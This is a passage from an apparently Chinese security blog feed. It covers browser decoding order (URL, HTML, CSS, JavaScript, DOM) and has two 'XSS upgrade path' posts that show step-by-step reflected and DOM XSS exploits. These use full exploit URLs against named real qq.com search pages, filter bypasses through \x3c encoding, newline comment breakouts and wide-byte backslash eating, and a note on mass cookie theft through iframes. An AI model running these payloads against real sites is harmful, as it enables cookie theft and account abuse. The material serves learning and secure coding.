<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">"http://www.example.com"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">"ht&#x74;p&#x3a;//www.example.com"</span>&gt;</span></div></pre></td></tr></table></figure>

<p>所以，在DOM 树构建完毕之后，这些HTML 实体编码的内容就会被解码。JS 的解释器还没有走进战场。不过由于DOM 的存在，JavaScript还是参与了DOM Tree 的构建过程，这时候，编码的解析就变得绕了一些。在此我们先忽略掉这一个，先继续讲主过程讲完，继续考虑这个代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"javascript:alert('&lt\u4e00&gt');"</span>&gt;</span>test<span class="tag">&lt;/<span class="title">a</span>&gt;</span></div></pre></td></tr></table></figure>

<p>HTMl 解析器构建DOM Tree, href中的内容，如果识别为实体编码的，会透明的解码，于是它就变成了这样：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"javascript:alert('&lt;\u4e00&gt;')"</span>&gt;</span>test<span class="tag">&lt;/<span class="title">a</span>&gt;</span></div></pre></td></tr></table></figure>

<h2 id="CSS_的编码问题">CSS 的编码问题</h2>
<p>一般来说，CSS 解析器会做接下来的工作，不过一般来说，为了考虑到更好的体验和性能，并不会等到所有的html都解析完成之后再去构建和布局render树。它是解析完一部分内容就显示一部分内容，同时，可能还在通过网络下载其余内容。</p>
<p>当然CSS不会干扰到DOM 树的建立，他会结合CSS文件和style 标签，以及HTML中的课件指令来构建起reder tree。这里JavaScrit 的 CSSOM api 也会出一些力。</p>
<p>CSS 编码解析是用了一套不太正统的转义策略：<strong>用一个反斜杠，后边跟1~6位十六进制数字构成。</strong>，所以字母e 可以编码为 \65, \065,\000065。而因为这样，后边就不能直接紧跟数字或字母，否则会被当成转义里的内容处理，所以CSS 选择了空格作为终止标识，在解码的时候，再将空格去除。</p>
<p>同时，CSS还支持直接使用反斜杠对非十六进制字符进行转义的方式，就按紧跟着反斜杠后边的字符的字面意思进行解释，这种机制可用来转义引号和反斜杠本身，不过不能转义HTML 控制的字符，比如尖括号，那是因为HTML 解析器总是先于CSS 解析器。</p>
<p>由于CSS 转义规定的语焉不详，许多解析器会对本该用引号括起来的字符串进行任意的转义，特别的，在IE 浏览器里，这种转义优先级高于伪函数语法，于是下边两种情况的写法是一样的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">color:expression(alert(1))</div><div class="line">color:expression\028 alert \028 1 \029 \029</div></pre></td></tr></table></figure>

<p>如果对该部分内容感兴趣，可以阅读开始提到的那篇文章，或者是我之前写的一些文章。</p>
<h2 id="JS_解释器">JS 解释器</h2>
<p>上边提到了style ，是建立reder tree 的时候使用的，它怎么工作的呢。考虑到我们的浏览器为了让不同的解析器来工作处理不同的内容，实际上，在处理诸如&lt; script&gt; &lt; style&gt; 这样的标签，解析器会自动切换到特殊解析模式，而src href 后边加入的JavaScript 伪URL，也会进入JS 的解析模式。而进入该解析模式的时候，该DOM节点已经建立起来了。</p>
<p>还是上边的例子，经过HTML 的解码，代码已经变成这样：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"javascript:alert('&lt;\u4e00&gt;')"</span>&gt;</span>test<span class="tag">&lt;/<span class="title">a</span>&gt;</span></div></pre></td></tr></table></figure>

<p>javascript 出发了JS 解释器，JS会先对内容进行解析，里边有一个转义字符\u4e00,前导的 \u 表示他是一个Unicode 字符，根据后边的数字，解析为’一’，于是在完成JS的解析之后变成了：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"javascript:alert('&lt;一&gt;')"</span>&gt;</span>test<span class="tag">&lt;/<span class="title">a</span>&gt;</span></div></pre></td></tr></table></figure>

<p>然后JS 解释器执行alert(“&lt; 一&gt;”)，这句话会交给浏览器渲染，最终弹窗。</p>
<p>这里边会有一个看起来让人有些疑惑的东西，仍以上一段代码为例，假如我们编码的位置不是括号里，而是在alert上，我们知道，js 是会对它进行逆转义的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"javascript:\u0061lert('&lt;一&gt;')"</span>&gt;</span>test<span class="tag">&lt;/<span class="title">a</span>&gt;</span></div></pre></td></tr></table></figure>

<p>而另一方面，如果想用这种方式来替换掉圆括号，或者引号，会判定为失败。同时，<strong>主要注意的方式，上边这种直接在字符串外进行专一的方式，只有Unicode 转义方式呗支持，其他转义方式则不行</strong>。其实，这样的策略是正确的，因为对于JavaScript，转义编码应当只出现在标示符部分，不能用于对语法有真正影响的符号，也就是括号，或者是引号。其实，这样的处理方法，反而是比CSS 更加合理的。</p>
<p>在一个页面中，可以出发JS 解析器的方式有这么几种：</p>
<ul>
<li>直接嵌入&lt; script&gt; 代码块。</li>
<li>通过&lt; script sr=… &gt; 加载代码。</li>
<li>各种HTML CSS 参数支持JavaScript：URL 触发调用。</li>
<li>CSS expression(…) 语法和某些浏览器的XBL 绑定。</li>
<li>事件处理器(Event handlers),比如 onload, onerror, onclick等等。</li>
<li>定时器，Timer(setTimeout, setInterval)</li>
<li>eval(…) 调用。</li>
</ul>
<p>我们看到，这些藏匿在HTML 便签中的各种JS 调用，就可以想到Web 开发者的头有多大了，我们举一个简单的栗子：</p>
<p>比如定时器那里，考虑以下代码：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt; script&gt;</div><div class="line"><span class="keyword">var</span> value = <span class="string">"user_string"</span>;</div><div class="line">...</div><div class="line">setTimeout(<span class="string">"do_stuff('"</span>+value+<span class="string">"')"</span>, <span class="number">1000</span>);</div><div class="line"><span class="xml"><span class="tag">&lt; /<span class="attribute">script</span>&gt;</span></span></div></pre></td></tr></table></figure>

<p>表面上看他没有问题，对 value 只做一次转义就好了，但实际呢，考虑其解析过程，首先是HTML 解析出script 块，然后JavaScript 做第一次解析，检查setTimeout 语法，而等到1秒之后，才会解析do_stuff，如果不多做一次转义，就有可能构造成一次注入，比如user_string 中插入一个JavaScript编码的构造，截断前边函数，然后构造自己的攻击部分。</p>
<p>下面我们说一说DOM，我们知道常见的DOM 操作：</p>
<p>DOM 常见的方法有：</p>
<ul>
<li>获取节点<ul>
<li>getElementsById()</li>
<li>getElementsByTagName()</li>
<li>getElementsByClassName()</li>
</ul>
</li>
<li>新增结点<ul>
<li>document.createElement()  创建节点对象，参数是字符串也就是html标签</li>
<li>createTextNode  创建文本节点，配合上一个使用</li>
<li>appendChild(element)  把新的结点添加到指定节点下，参数是一个节点对象</li>
<li>insertChild()  在指定结点钱插入新的节点</li>
</ul>
</li>
<li>修改节点<ul>
<li>replaceChild()  节点交换</li>
<li>setAttribute()  设置属性</li>
</ul>
</li>
<li>删除节点<ul>
<li>removeChild(element)  删除节点，要先获得父节点然后再删除子节点</li>
</ul>
</li>
<li>一些属性<ul>
<li>innerHTML 节点内容，可以获取或者设置</li>
<li>parentNode  当前节点的父节点</li>
<li>childNode  子节点</li>
<li>attributes  节点属性</li>
<li>style  修改样式</li>
</ul>
</li>
</ul>
<p>这样就有一些疑惑了，之前，我们说了，基本的解析顺序是这样的，URL 解析器，HTML 解析器， CSS 解析器，JS解析器，如果安安静静的按照这个顺序下去，应该很容易理清楚。然而DOM 操作里我们可以看到可以新增节点，也可以修改节点属性，节点的内容和样式都可以修改。那么假如我们使用innerHTML 修改了某节点的内容，让其构成了一个新的节点，那么会有什么效果呢？我在Chrome 上做了一些实验，代码如下:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">id</span>=<span class="value">"1"</span>&gt;</span>hello<span class="tag">&lt;/<span class="title">p</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">#</span> <span class="attribute">onerror</span>=<span class="value">"&#97;lert(1)"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">"1"</span>).innerHTML = <span class="string">"&lt;img src=&#35; on\u0065rror=&#97;lert&#40;1)&gt;"</span>;  </div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--&lt;script&gt;</span></div><div class="line">document.getElementById("1").innerHTML = "&#60;img src=&#34;1&#34; onerror=&#34;alert(1)&#34;&#62;";  </div><div class="line">&#38;&#35;&#57;&#55;&#59;</div><div class="line">&lt;/script&gt;--&gt;</div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></div></pre></td></tr></table></figure>

<p>一个正常的容易理解的过程是这一行：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">#</span> <span class="attribute">onerror</span>=<span class="value">"&#97;lert(1)"</span> /&gt;</span></div></pre></td></tr></table></figure>

<p>HTML 解析到标签，建立DOM 树，然后对节点内容进行实体解码，&amp;#97； 就变成a, 随后在js 解析阶段，正常的触发了弹窗，先后顺序OK。</p>
<p>但对于下面这段代码：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">"1"</span>).innerHTML = <span class="string">"&lt;img src=&#35; on\u0065rror=&#97;lert&#40;1)&gt;"</span>;  </div><div class="line"><span class="xml"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span></div></pre></td></tr></table></figure>

<p>使用了DOM 操作，修改前边标签中的内容，添加了一个img 内容，因为进入了script 进入了JavaScript的特殊解析模式，所以此处HTML 不得干扰，首先JavaScript解析器，会先对其中编码的内容解码，于是onerror 就还原回来了，于是正常的执行了JS 语句，在HTML 文档中，将hello 变成了img。 </p>
<p>那么问题来了，如上那样，对onerror 的内容作了HTML 实体编码，会不会弹窗呢？ 答案是显然的，该标签传回给HTML，HTML 建立DOM节点，透明的解码节点内容，onerror 又会执行其中的JS 脚本，弹出窗口。</p>
<p>其实，这里也不难理解，因为HTML 是从上到下解析，遇到&lt; script&gt; 于是进入了特殊的解析模式，使用JS 解析器，做了一个DOM 操作，该DOM 操作修改了前边的DOM 树，该块内容，需要使用HTML 解析重塑DOM 树，那么节点内容中的实体编码就会被解码，然后onerror 中触发脚本，JS 又会对内容进行一次解析。</p>
<p>这一点很好理解：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=<span class="string">"1"</span> onerror=<span class="string">"&#97;l\u0065rt(1)"</span> /&gt;</div></pre></td></tr></table></figure>

<p>如上，内容中有HTML实体编码，还有js 的Unicode 编码，正常弹窗没有问题。</p>
<p>总结说来，实际上，DOM 操作实际上是js强势介入 HTML 和CSS 的结果，使用DOM 操作，对DOM Tree 造成了改变，会调用到HTML 解析器重新对其解析，于是流程又会返回到最开始说的那个解析流程里去。这样反复的情况，再加上编码的重叠，很容易让开发者无所适从，考虑下面的代码：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;p id="1"&gt;hello&lt;/p&gt;</div><div class="line"></div><div class="line">&lt;img src="1" onerror="&#97;l\u0065rt(1)" /&gt;</div><div class="line">&lt;script&gt;</div><div class="line">document.getElementById("1").innerHTML = "bye";</div><div class="line"></div><div class="line">function a(){</div><div class="line">document.getElementById("1").innerHTML = "&lt;img src=# on\u0065rror=&#97;&#108;&#101;&#114;&#116;(1)&gt;";</div><div class="line">}</div><div class="line"></div><div class="line">function timedMsg()</div><div class="line">{</div><div class="line">var t=setTimeout("a()",5000)</div><div class="line">}</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;input type="button" value="111" onClick = "timedMsg()" /&gt;</div></pre></td></tr></table></figure>

<p>整个页面渲染完毕，而当点击按钮之后，会触发DOM操作的脚本，五秒钟之后，弹窗。</p>
<p>如果想要修改的内容中有脚本，内容中的脚本部分使用JS编码，再使用HTML 编码，然后再使用JS Unicode编码，那么解码的过程就是先JS 解码，再HTML 解码，再JS 解码，然后执行。</p>
<h2 id="总结">总结</h2>
<p>其实总的来说，其道理还是易于理解的，只是由于一些特别的操作，造成了一些困扰，于是在编码上，会理不清头绪，如果再此基础上我们再使用String.fromCharCode() 这个一直以来容易被开发者忽略的功能，更会摸不清头脑。</p>
<p>而正是由于这种摸不清头脑的开发之下，黑客们才有可趁之机，制造各种变体，绕过孱弱的过滤器。</p>
<p>总体来说，在编码这件事上，只要理清楚，URL解码，HTML解码，CSS解码，JS解码，以及DOM 操作在其中扮演的角色，就基本上能理清楚了。作为一个开发者，安全编码是必须要重视的内容，所以，对于编码，不可以逃避，在构建安全的过滤规则的时候，一定要考虑清楚各种可能的编码绕过的方式,以避免损失。</p>
<p>如何避免这些漏洞的产生，我会再以后继续写，关于浏览器的解码过程就写到这里吧。对这一问题，仍然还有一些问题有待解决，个人能力有限，其中也有可能存在错误和疏漏，请谅解~</p>
<p>PS. 参考：开头提到的文章，W3cschool 上各种函数，各种编码。《The Tangled Web》这本神书，和一堆谷歌搜索。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="浏览器是如何解码的">浏览器是如何解码的</h1>
<p>无论是作为开发，还是作为黑客，企图从Web 端注入SQL，或者是XSS 的时候，编码和解码都是一个重要的问题、作为一个浏览器，有URL解析引擎，有HTML解析引擎，还有JS 解析引擎。其执行的先后顺序往往决]]>
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[DOM XSS启程 -- XSS升级之路]]></title>
    <link href="http://yoursite.com/2016/05/17/DOM-XSS%E5%90%AF%E7%A8%8B-XSS%E5%8D%87%E7%BA%A7%E4%B9%8B%E8%B7%AF/"/>
    <id>http://yoursite.com/2016/05/17/DOM-XSS启程-XSS升级之路/</id>
    <published>2016-05-17T15:00:38.000Z</published>
    <updated>2016-05-17T15:01:03.000Z</updated>
    <content type="html"><![CDATA[<h1 id="DOM_XSS启程">DOM XSS启程</h1>
<p>之前提到的漏洞内容，都是反射型XSS，攻击性一般来说比较低，即用即消，难以持久，而且一般来说，如果cookie 设置成httponly，你就不能通过document.cookie 的方式获取cookie了，在做其他一些事情，反射型xss就显得乏力了。不过，如果没有设置成httponly，还是有方法获取到海量的用户cookie,简单的利用方法就是在一个自己可控的站点，控制一个iframe，然后链接到主站可xss利用的站点，在URL 里写好脚本，做好接受，就能源源不断的接受来自用户的信息了。</p>
<p>比如说新浪微博或者是腾讯微博存在XSS反射漏洞，我们在自己的站点中写好利用的iframe，然后在自己的微博上写一个吸引人的标题，然后附一个经过短链接转义过得链接。如果别人点进去，就会自动触发我们的XSS 脚本。以前Twitter 上也有这样的漏洞，短时间让黑客的粉丝暴涨百万，实际上只是自动执行了关注黑客的脚本。</p>
<p>下面我们进入下一个XSS类型，DOM XSS。所谓DOM 操作，就是利用JavaScript 的DOM 操作来进行利用。关于DOM树，DOM操作的基础，可以参见<a href="https://zh.wikipedia.org/wiki/%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B" target="_blank" rel="external">wikipedia</a> ，可以查看更多信息。</p>
<p>DOM 常见的方法有：</p>
<ul>
<li>获取节点<ul>
<li>getElementsById()</li>
<li>getElementsByTagName()</li>
<li>getElementsByClassName()</li>
</ul>
</li>
<li>新增结点<ul>
<li>document.createElement()  创建节点对象，参数是字符串也就是html标签</li>
<li>createTextNode  创建文本节点，配合上一个使用</li>
<li>appendChild(element)  把新的结点添加到指定节点下，参数是一个节点对象</li>
<li>insertChild()  在指定结点钱插入新的节点</li>
</ul>
</li>
<li>修改节点<ul>
<li>replaceChild()  节点交换</li>
<li>setAttribute()  设置属性</li>
</ul>
</li>
<li>删除节点<ul>
<li>removeChild(element)  删除节点，要先获得父节点然后再删除子节点</li>
</ul>
</li>
<li>一些属性<ul>
<li>innerHTML 节点内容，可以获取或者设置</li>
<li>parentNode  当前节点的父节点</li>
<li>childNode  子节点</li>
<li>attributes  节点属性</li>
<li>style  修改样式</li>
</ul>
</li>
</ul>
<p>下面我们回到XSS 上，如何利用一个显式的DOM XSS。</p>
<p>这样一个URL：<br><a href="http://datalib.ent.qq.com/cgi-bin/search?libid=1&amp;keyvalue=aaaaaaa&amp;attr=133&amp;stype=2&amp;tname=star_second.shtml" target="_blank" rel="external">http://datalib.ent.qq.com/cgi-bin/search?libid=1&amp;keyvalue=aaaaaaa&amp;attr=133&amp;stype=2&amp;tname=star_second.shtml</a></p>
<p>我们在代码中寻找其输出：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-17-14634946364874.jpg" alt=""></p>
<p>发现了很多个，将其代码格式化之后如下，我们会实际上，被执行的只有一个：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;strong id=<span class="string">"titleshow"</span>&gt;按职业<span class="number">1</span>检索：aaaaaaa &lt;<span class="regexp">/strong&gt;&lt;/</span>div&gt;</div><div class="line"></div><div class="line"><span class="xml"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span></span></div><div class="line"><span class="keyword">if</span>(<span class="string">"aaaaaaa"</span>==<span class="string">""</span>)</div><div class="line"></div><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">"titleshow"</span>).innerHTML=<span class="string">"按地区检索：全部明星"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="string">"职业1"</span>==<span class="string">"职业1"</span>)</div><div class="line"></div><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">"titleshow"</span>).innerHTML=<span class="string">"按职业检索：aaaaaaa"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="string">"职业1"</span>==<span class="string">"职业2"</span>)</div><div class="line"></div><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">"titleshow"</span>).innerHTML=<span class="string">"按职业检索：aaaaaaa"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="string">"职业1"</span>==<span class="string">"职业3"</span>)</div><div class="line"></div><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">"titleshow"</span>).innerHTML=<span class="string">"按职业检索：aaaaaaa"</span>;</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p>我们先测试几个特殊字符，发现尖括号被过滤了，但是\ 没有被过滤，而这里又是JS 代码，我们可以十三月Unicode 编码来代替尖括号，仍然可以实现代码利用。\u003c \003e 分别代表尖括号，\0020 代表空格。 而这里其实有一个比较关键的知识点，为什么有时候转义可以，有时候转义不行，编码解码的顺序到底是怎样的，具体可以看下一条文章。</p>
<p>所以，我们构造的完整URL 如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://datalib.ent.qq.com/cgi-bin/search?<span class="variable">libid=</span><span class="number">1</span>&<span class="variable">keyvalue=</span>\u003Cimg\<span class="variable">u0020src=</span><span class="number">1</span>\<span class="variable">u0020onerror=</span>alert(<span class="number">1</span>)\u003e&<span class="variable">attr=</span><span class="number">133</span>&<span class="variable">stype=</span><span class="number">2</span>&<span class="variable">tname=</span>star_second.shtml</div></pre></td></tr></table></figure>

<p>但是，左右尖括号的Unicode表示已经被过滤：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-17-14634949862018.jpg" alt=""></p>
<p>但仔细观察一下，我们发现，\u0020 都没有被转义，说明开发者的转义是非常局限的，指哪打哪，很有可能有别的方法可以利用。而Unicode 编码也有多种书写方式，比如 \x3c \x3e 就可以代表左右尖括号。那么我们值得一试：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://datalib.ent.qq.com/cgi-bin/search?<span class="variable">libid=</span><span class="number">1</span>&<span class="variable">keyvalue=</span>\x3Cimg\<span class="variable">u0020src=</span><span class="number">1</span>\<span class="variable">u0020onerror=</span>alert(<span class="number">1</span>)\x3e&<span class="variable">attr=</span><span class="number">133</span>&<span class="variable">stype=</span><span class="number">2</span>&<span class="variable">tname=</span>star_second.shtml</div></pre></td></tr></table></figure>

<p>令人惊奇的是竟然没有转义：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-17-14634951065021.jpg" alt=""></p>
<p>这样，弹窗就是必然的了。</p>
<p>这是一次简单的DOM XSS 过程，后边会有更加复杂的XSS等待挖掘。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="DOM_XSS启程">DOM XSS启程</h1>
<p>之前提到的漏洞内容，都是反射型XSS，攻击性一般来说比较低，即用即消，难以持久，而且一般来说，如果cookie 设置成httponly，你就不能通过document.cookie 的方式获取cookie了，]]>
    </summary>
    
      <category term="TCP/IP" scheme="http://yoursite.com/tags/TCP-IP/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[(level 6)符号的进阶 -- XSS升级之路]]></title>
    <link href="http://yoursite.com/2016/05/16/-level-6-%E7%AC%A6%E5%8F%B7%E7%9A%84%E8%BF%9B%E9%98%B6-XSS%E5%8D%87%E7%BA%A7%E4%B9%8B%E8%B7%AF/"/>
    <id>http://yoursite.com/2016/05/16/-level-6-符号的进阶-XSS升级之路/</id>
    <published>2016-05-16T03:04:34.000Z</published>
    <updated>2016-05-16T03:05:05.000Z</updated>
    <content type="html"><![CDATA[<h1 id="符号的进阶">符号的进阶</h1>
<p>上一次是反斜杠发挥的妙用，它默默地转义了一个双引号，还有一些其他有意思的符号，比如换行符也能发挥妙用，这次是来自换行符的一发偷袭。</p>
<p>看这样一个地址：<br><a href="http://datalib.games.qq.com/cgi-bin/search?libid=178&amp;FilterAttrAND=3602&amp;FilterValueAND=aaaaaaaaaa" target="_blank" rel="external">http://datalib.games.qq.com/cgi-bin/search?libid=178&amp;FilterAttrAND=3602&amp;FilterValueAND=aaaaaaaaaa</a></p>
<p>逐个测试注入点，我们发现最后的FilterValueAND 的输入点在源码中找到了输出点：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-16-14633225014088.jpg" alt=""></p>
<p>它出现在JS 语句里，一上来就感觉有戏。接下来尝试写入特殊字符，测试过滤情况。正常的情况下，尖括号，双引号：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-16-14633226756194.jpg" alt=""></p>
<p>但是令人奇怪的是，最后一个输出点竟然是在一大段注释里，这应该是开发的一个失误：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-16-14633227582291.jpg" alt=""></p>
<p>看到注释想到了什么呢？如果这里插进来一个换行符，那么应该被注释的部分就不是注释了。那后边再跟注入语句，就能够执行了。然后我们在用一个双斜杠来注释后边的无用部分。利用代码如下：<br><a href="http://datalib.games.qq.com/cgi-bin/search?libid=178&amp;FilterAttrAND=3602&amp;FilterValueAND=%0aalert(/xss/);//" target="_blank" rel="external">http://datalib.games.qq.com/cgi-bin/search?libid=178&amp;FilterAttrAND=3602&amp;FilterValueAND=%0aalert(/xss/);//</a></p>
<p>直接就弹窗了。</p>
<p>这一次利用的太过简单，看起来应该是开发的一时疏忽，将一大段内容注释了，而注释里原本好包含了输出，那就有可能出问题了。</p>
<p>那么下面再看一个更综合的例子，地址如下：<br><a href="http://cgi.data.tech.qq.com/index.php?mod=search&amp;type=data&amp;site=digi&amp;libid=2&amp;curpage=1&amp;pagenum=30&amp;filterattr=138,138|16|4,5,4,5&amp;filtervalue=3500-4000,%B4%F3%D3%DA4000|%D0%FD%D7%AA|WCDMA,WCDMA,HSDPA,HSDPA&amp;tplname=centersearch.shtml&amp;orderby=aaaaaaaaaaaa" target="_blank" rel="external">http://cgi.data.tech.qq.com/index.php?mod=search&amp;type=data&amp;site=digi&amp;libid=2&amp;curpage=1&amp;pagenum=30&amp;filterattr=138,138|16|4,5,4,5&amp;filtervalue=3500-4000,%B4%F3%D3%DA4000|%D0%FD%D7%AA|WCDMA,WCDMA,HSDPA,HSDPA&amp;tplname=centersearch.shtml&amp;orderby=aaaaaaaaaaaa</a></p>
<p><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-16-14633230686974.jpg" alt=""></p>
<p>看一下源码，先测试双引号，妥妥的被过滤，HTML标签里的东西没希望了。往后边看，第二个又出现在了注释里，看来开发还是很希望遗留这些漏洞的，我们直接用一个换行符。</p>
<p>但问题是注释那里被注释掉了，但是接下来的var searchOrder=”….”;这一句就麻烦了。</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//document.getElementById("order_select").value="aaa</div><div class="line">alert(/xss/); //";</div><div class="line"></div><div class="line">var searchOrder="aaa</div><div class="line">alert(1);//";</div></pre></td></tr></table></figure>

<p>第一个是OK 了，第二个语法错误了。那么又想到什么了呢，在JavaScript 语法里，一个反斜杠可以让语法让换行的内容接起来，形成多行写法。</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> sarchOrder=<span class="string">"aaa\</span></div><div class="line">alert(/xss/);//";</div></pre></td></tr></table></figure>

<p>于是，语法上又恢复了正常，而这一部分内容我们不用管它，只要上一个有效就可以了。但问题是，反斜杠被过滤了，过滤的方法是被转义了。<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-16-14633235895962.jpg" alt=""></p>
<p>两个反斜杠就没法让JavaScript成立了，怎么办呢？记得之前采用的宽字符的战术，看一眼网页的编码格式,gb2312，说明宽字节是有效的。那我们就用128以上的字符，去吃掉一个反斜杠：</p>
<p><a href="http://cgi.data.tech.qq.com/index.php?mod=search&amp;type=data&amp;site=digi&amp;libid=2&amp;curpage=1&amp;pagenum=30&amp;filterattr=138,138|16|4,5,4,5&amp;filtervalue=3500-4000,%B4%F3%D3%DA4000|%D0%FD%D7%AA|WCDMA,WCDMA,HSDPA,HSDPA&amp;tplname=centersearch.shtml&amp;orderby=aaaa%c0%5c%0aalert(1);//" target="_blank" rel="external">http://cgi.data.tech.qq.com/index.php?mod=search&amp;type=data&amp;site=digi&amp;libid=2&amp;curpage=1&amp;pagenum=30&amp;filterattr=138,138|16|4,5,4,5&amp;filtervalue=3500-4000,%B4%F3%D3%DA4000|%D0%FD%D7%AA|WCDMA,WCDMA,HSDPA,HSDPA&amp;tplname=centersearch.shtml&amp;orderby=aaaa%c0%5c%0aalert(1);//</a></p>
<p>从结果上看，%c0吃掉了一个%5c，留下了一个反斜杠。<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-16-14633239849141.jpg" alt=""></p>
<p>语法完全ok, 于是弹窗。</p>
<p>至此，这种反射型的XSS 基本上就这么些内容了。想要挖XSS 的洞，非常的耗费功夫，因为即使是没有安全编码尝试的开发者，也基本知道一些必须过滤的字符一定要过滤，另外在PHP 这些语言中，也有专门的函数诸如魔术引号来过滤处理。</p>
<p>不过学习这种XSS 类型，将扩宽思路，不仅是从注入的角度来看，能想到各种有意思的注入和XSS 利用，更重要的是从安全编码的角度看待开发，如何保证代码的安全实际上是比效率更加重要的点。</p>
]]></content>
    <summary type="html">
